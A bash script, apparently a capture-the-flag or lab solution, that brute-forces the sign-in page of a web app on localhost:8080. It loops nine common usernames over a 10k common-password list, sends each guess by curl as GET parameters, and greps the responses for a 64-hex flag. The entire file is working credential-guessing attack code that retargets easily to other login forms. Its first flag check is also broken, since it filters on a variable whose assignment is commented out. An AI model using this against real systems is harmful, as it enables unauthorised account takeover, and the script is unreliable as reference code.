#!/bin/bash

# Brute force script for login page at http://localhost:8080/index.php?page=signin
# Uses the 10k-most-common.txt password list

BASE_URL="http://localhost:8080/index.php"
PASSWORD_FILE="10k-most-common.txt"

# Common usernames to try
USERNAMES=("admin" "root" "administrator" "user" "test" "guest" "admin1" "Admin" "ADMIN")

echo "🔐 Starting brute force attack..."
echo "🎯 Target: $BASE_URL?page=signin"
echo "📋 Loading passwords from $PASSWORD_FILE..."

if [ ! -f "$PASSWORD_FILE" ]; then
    echo "❌ Error: Password file '$PASSWORD_FILE' not found!"
    exit 1
fi

PASSWORD_COUNT=$(wc -l < "$PASSWORD_FILE")
echo "✅ Loaded $PASSWORD_COUNT passwords"
echo "👤 Trying ${#USERNAMES[@]} common usernames"
echo ""

TOTAL_ATTEMPTS=0
FOUND=false

for username in "${USERNAMES[@]}"; do
    echo "🔍 Testing username: $username"
    
    while IFS= read -r password; do
        TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + 1))
        
        # Show progress every 500 attempts
        if [ $((TOTAL_ATTEMPTS % 500)) -eq 0 ]; then
            echo -ne "\r   ⏳ Attempts: $TOTAL_ATTEMPTS..."
        fi
        
        # Make the request: http://localhost:8080/index.php?page=signin&username=XXX&password=YYY&Login=Login#
        RESPONSE=$(curl -s "$BASE_URL?page=signin&username=$username&password=$password&Login=Login#" 2>/dev/null)
        
        # # Check for flag in response (but exclude the footer flag)
        # # The footer always has: b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
        # FOOTER_FLAG="b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
        
        # # Look for any flag pattern
        FLAG=$(echo "$RESPONSE" | grep -oE '[a-f0-9]{64}' | grep -v "$FOOTER_FLAG" | head -n1)
        
        if [ -n "$FLAG" ]; then
            echo ""
            echo "============================================================"
            echo "🎉 SUCCESS! Credentials found:"
            echo "   Username: $username"
            echo "   Password: $password"
            echo "   🏴 Flag: $FLAG"
            echo "============================================================"
            echo ""
            FOUND=true
            break
        fi
        
        # Also check if response contains "flag" keyword (case insensitive)
        if echo "$RESPONSE" | grep -qi "flag"; then
            # Make sure it's not just the footer
            if ! echo "$RESPONSE" | grep -qi "copyright.*flag\|footer.*flag"; then
                echo ""
                echo "============================================================"
                echo "🎉 SUCCESS! Credentials found:"
                echo "   Username: $username"
                echo "   Password: $password"
                # Try to extract the actual flag
                FLAG=$(echo "$RESPONSE" | grep -oE '[a-f0-9]{64}' | head -n1)
                if [ -n "$FLAG" ]; then
                    echo "🏴 Flag: $FLAG"
                    echo "============================================================"
                    echo ""
                fi
                FOUND=true
                break
            fi
        fi
        
    done < "$PASSWORD_FILE"
    
    if [ "$FOUND" = true ]; then
        break
    fi
    
    echo "   ❌ No match found for username: $username"
done

if [ "$FOUND" = false ]; then
    echo ""
    echo "❌ No valid credentials found after $TOTAL_ATTEMPTS attempts"
fi